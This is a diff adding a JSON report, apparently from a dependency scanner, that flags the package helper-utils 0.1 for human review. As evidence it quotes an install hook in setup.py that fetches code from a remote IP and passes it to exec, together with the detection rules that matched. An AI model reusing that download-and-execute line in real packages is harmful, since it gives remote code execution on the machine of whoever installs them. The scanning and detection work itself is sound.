@@ -1,0 +1,61 @@
+{
+ "kind": "install",
+ "mode": "user",
+ "verdict": "NEEDS_HUMAN_REVIEW",
+ "command": "pip install helper-utils==0.1",
+ "packages": [
+  {
+   "package": "helper-utils",
+   "version": "0.1",
+   "verdict": "NEEDS_HUMAN_REVIEW",
+   "score": 0.52,
+   "location": "setup.py:14",
+   "path": "the code in setup.py runs the moment it is installed",
+   "risk": "just installing it may run code fetched from outside",
+   "reason": "pattern that runs content fetched over the network inside an install hook",
+   "benign_cases": "a build tool downloading a binary",
+   "evidence": [
+    {
+     "rule": "install_hook",
+     "label": "install hook",
+     "location": "setup.py:9",
+     "snippet": "class PostInstall(install):",
+     "count": 1
+    },
+    {
+     "rule": "download_exec",
+     "label": "runs downloaded code right away",
+     "location": "setup.py:14",
+     "snippet": "exec(urllib.request.urlopen(\"http://203.0.113.7/p\").read())",
+     "count": 1
+    },
+    {
+     "rule": "keyword",
+     "label": "uses a dangerous API",
+     "location": "setup.py:14",
+     "snippet": "exec(",
+     "count": 1
+    }
+   ],
+   "other_reasons": [
+    "custom install hook in setup.py",
+    "exec of a network response inside an install hook"
+   ],
+   "headline": "remote code execution at install",
+   "ml_status": "disabled",
+   "advice": {
+    "vuln_groups": [],
+    "vuln_count": 0,
+    "ids": [],
+    "severity": null,
+    "fix_version": null,
+    "fix_missing": 0
+   },
+   "coverage": {
+    "analyzed": true,
+    "notes": []
+   }
+  }
+ ],
+ "integrity_findings": []
+}
